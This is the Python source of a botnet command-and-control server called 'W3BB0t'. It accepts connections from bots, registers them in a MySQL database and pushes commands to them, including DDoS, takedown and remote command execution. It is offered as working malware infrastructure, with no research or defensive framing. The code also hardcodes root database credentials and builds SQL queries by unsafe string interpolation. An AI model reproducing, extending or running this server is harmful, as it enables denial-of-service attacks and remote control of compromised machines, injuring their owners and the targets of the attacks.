#!/usr/bin/env python2.7
# coding=utf-8

import socket
import os, sys
import time, base64

import hashlib
import requests
import _mysql
import thread
import json


def Error_logger(error, error_name):

  error = str(error)
  error_string = str('\n [!] %s: %s\n' %(error_name, error))

  error_log_file = open('logs/w3bb0t_error.log', 'a')
  error_log_file.write(error_string)

  error_log_file.close()

  return True


def Read_BConfig_File():

  rounds = 0

  while(rounds < 10):
    
    try:
      
      config_file = open('bot_ccommands', 'r')

      config_dict = json.loads(config_file.read())

      config_file.close()

      rounds = 10
      return config_dict

    except Exception as read_bconfig_error:
      
      Error_logger(read_bconfig_error, 'Read_BConfig_File')
      rounds += 1


def Clear_BConfig_File():

  base_config_file = {
    'command': 'Null',
    'bot': 'Null'
  }

  try:

    base_config_json = json.dumps(base_config_file)

    config_file = open('bot_ccommands', 'w')
    
    config_file.write(base_config_json)
    config_file.close()
    
    return True

  except Exception as clear_bconfig_error:
    
    Error_logger(clear_bconfig_error, 'Clear_BConfig_File')

    return False


def Decode_BConfig_File():

  valid_commands = {
                    'Command_Bot.Ddos' : True,
                    'Command_Bot.Down' : True,
                    'Command_Bot.Cmdexec' : True,
                    'Command_Bot.Shutdown': True,
                    'Command_Bot.Restart': True
                    }

  config_file = Read_BConfig_File()

  if(config_file['command'] == 'Null'):
    
    return True

  elif(valid_commands[config_file['command'].split('{')[0]]):

    Send_Command(config_file['command'], config_file['bot'])

    Clear_BConfig_File()

    return False

def Bot_Registred(mysql_host, mysql_user, mysql_pass, mysql_db, bot):
  
  bot_reg_query = str('SELECT bot_token FROM Bot_Data WHERE bot_token="%s";' %(str(bot)))

  w3bbot_sql = _mysql.connect(mysql_host, mysql_user, mysql_pass, mysql_db)
  w3bbot_sql.query(bot_reg_query)
      
  bot_registred = w3bbot_sql.store_result()

  if(int(bot_registred.num_rows()) > 0):

    w3bbot_sql.close()
    return True #Bot registred
  
  else:

    w3bbot_sql.close()
    return False #Bot not registred



def Base_Connection(host, port):

  so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  so.bind((host, port))
  so.listen(200) # Number of connection socket accept 

  def Comand_Taccept():
    while(True):
      bot_conection, bot_addr = so.accept()

      if(bot_conection != ''):
        clients.append(bot_conection)

      else:
        pass

  thread.start_new_thread(Comand_Taccept, ())


def Recive_Command(mysql_host, mysql_user, mysql_pass, mysql_db):

  while True:
    '''
    print ('[!]Debug: clients ' + str(clients))

    r_clients = clients
    print ('[!]Debug: numeros de bots(' + str(len(r_clients)))
    '''
    
    for bot in clients:

      if(not Bot_Registred(mysql_host, mysql_user, mysql_pass, mysql_db, bot)):
        
        bot_data = ''
        
        while(bot_data == ''):

          try:
          
            bot_data = bot.recv(1024)

            if(bot_data.split('{')[0] == 'Server.RG'): # Server.RG{pc_name, bot_os, addrres}

              w3bbot_sql = _mysql.connect(mysql_host, mysql_user, mysql_pass, mysql_db)
              
              bot_name = str((bot_data.split('{')[1].split('}')[0].split(',')[0]).replace(' ', ''))
              bot_os = str((bot_data.split('{')[1].split('}')[0].split(',')[1]).replace(' ', ''))
              bot_address = str((bot_data.split('{')[1].split('}')[0].split(',')[2]).replace(' ', ''))
              bot_token = str(bot)

              register_query = str('INSERT INTO Bot_Data(bot_address, bot_name, bot_osystem, bot_status, bot_token) VALUES(%s, %s, %s, 1, "%s")' %(bot_address, bot_name, bot_os, bot_token))
              #print('[Debug]' + register_query)

              w3bbot_sql.query(register_query)
              
              #r_clients.remove[bot]

              Send_Command('Command_Bot.RPS{True}', [bot])

              w3bbot_sql.close()

            elif(bot_data.split('{')[0] == 'Server.PING'): # Server.PING{1, addrres}
              
              w3bbot_sql = _mysql.connect(mysql_host, mysql_user, mysql_pass, mysql_db)

              ping_value = int((bot_data.split('{')[1].split('}')[0].split(',')[0]).replace(' ', ''))
              bot_address = str((bot_data.split('{')[1].split('}')[0].split(',')[1]).replace(' ', ''))
              
              ping_query = str('UPDATE Bot_Data SET bot_status=%i WHERE bot_address=%s' %(ping_value, bot_address)) # editar depois usar a conn na db 
              #print('[Debug]' + ping_query)

              w3bbot_sql.query(ping_query)

              #r_clients.remove[bot]

              Send_Command('Command_Bot.RPS{True}', [bot])

              w3bbot_sql.close()
          
          except Exception as recive_command_socket_error:

            Send_Command('Command_Bot.RPS{False}', [bot])
            
            Error_logger(recive_command_socket_error, 'Recive_Command')

'''        elif(bot_data.split('{')[0] == 'Server.RG'): # Server.RG{pc_name, bot_os, addrres}
          
          bot_name = str((bot_data.split('{')[1].split('}')[0].split(',')[0]).replace(' ', ''))
          bot_os = str((bot_data.split('{')[1].split('}')[0].split(',')[1]).replace(' ', ''))
          bot_address = str((bot_data.split('{')[1].split('}')[0].split(',')[2]).replace(' ', ''))
          bot_token = str(bot)

          register_query = str('INSERT INTO Bot_Data(bot_address, bot_name, bot_osystem, bot_status, bot_token) VALUES(%s, %s, %s, 1, "%s")' %(bot_address, bot_name, bot_os, bot_token))
          #print('[Debug]' + register_query)

          w3bbot_sql.query(register_query)
          
          r_clients.remove[bot]

          Send_Command('Command_Bot.RPS{True}', [bot])'''
            

def Send_Command(command, bot):

  send_rounds = True

  if(len(bot) == 0 or bot[0] == 'wb_BotAll'):

    while(send_rounds and len(clients) > 0):
      
      for b_bot in clients:

        try:

          b_bot.send(str(command).encode('ascii'))
          send_rounds = False

        except Exception as send_command_socket_error:

          Error_logger(send_command_socket_error, 'Send_Command[LT]')


  elif(len(bot) > 0 and bot[0] != 'wb_BotAll'):
  
    while(send_rounds):

      for b_bot in bot:

        try:

          #print(type(b_bot))
          b_bot.send(str(command).encode('ascii'))
          send_rounds = False

        except Exception as send_command_socket_error:

          Error_logger(send_command_socket_error, 'Send_Command[DB]')
        

def main():

  global clients
  clients = []

  host_ip = str('192.168.0.7')
  host_port = int(9878)

  mysql_host = str('127.0.0.1')
  mysql_user = str('root')
  mysql_pass = str('toor')
  mysql_db = str('W3BB0t')

  Base_Connection(host_ip, host_port)

  thread.start_new_thread(Recive_Command, (mysql_host, mysql_user, mysql_pass, mysql_db, ))

  while(True):

    #print ('[!]Debug: %s' %(clients))

    try:
      
      Decode_BConfig_File()

    except Exception as main_decode_error:

      Error_logger(main_decode_error, 'main_decode_error')

if __name__ == '__main__':
  main()

#importante tambem lembrar para reutilizar o address no socket pra toda hr nao ter que esperar pra krl !!!
